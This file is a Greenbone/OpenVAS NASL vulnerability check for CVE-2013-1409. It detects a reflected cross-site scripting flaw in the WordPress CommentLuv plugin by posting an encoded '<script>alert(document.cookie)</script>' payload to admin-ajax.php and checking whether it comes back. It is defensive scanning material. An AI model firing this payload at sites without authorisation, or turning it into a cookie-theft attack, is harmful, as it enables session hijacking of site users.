# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804512");
  script_version("2023-10-27T05:05:28+0000");
  script_cve_id("CVE-2013-1409");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2023-10-27 05:05:28 +0000 (Fri, 27 Oct 2023)");
  script_tag(name:"creation_date", value:"2014-03-11 13:43:20 +0530 (Tue, 11 Mar 2014)");
  script_name("WordPress CommentLuv Plugin '_ajax_nonce' Cross-Site Scripting Vulnerability");

  script_tag(name:"summary", value:"WordPress CommentLuv Plugin is prone to a cross-site scripting (XSS) vulnerability.");
  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request and check whether it is able to read
cookie or not.");
  script_tag(name:"insight", value:"Flaw is due to improper validation of the '_ajax_nonce' parameter upon
submission to the '/wp-admin/admin-ajax.php' script.");
  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary HTML and
script code in a user's browser session in the context of an affected site.");
  script_tag(name:"affected", value:"WordPress CommentLuv Plugin version before 2.92.4");
  script_tag(name:"solution", value:"Update to version 2.92.4 or later.");
  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://secunia.com/advisories/52092");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/57771");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/120090");
  script_xref(name:"URL", value:"https://www.htbridge.com/advisory/HTB23138");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_analysis");
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_mandatory_keys("wordpress/http/detected");
  script_require_ports("Services/www", 80);
  script_xref(name:"URL", value:"http://wordpress.org/extend/plugins/commentluv");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + "/wp-admin/admin-ajax.php";

postData = 'action=cl_ajax&do=fetch&url=1&_ajax_nonce=%3Cscript%3E'+
           'alert%28document.cookie%29%3B%3C%2Fscript%3E';

useragent = http_get_user_agent();

# nb: http_host_name() should be always after the static string(s) above but always after any
# dynamically ones (e.g. a random string) which should be different for each hostname.
host = http_host_name(port:port);

req = string("POST ", url, " HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "User-Agent: ", useragent, "\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Content-Length: ", strlen(postData), "\r\n",
             "\r\n", postData, "\r\n");
res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if(res =~ "^HTTP/1\.[01] 200" && "<script>alert(document.cookie);</script>" >< res &&
   "error! not authorized" >< res) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
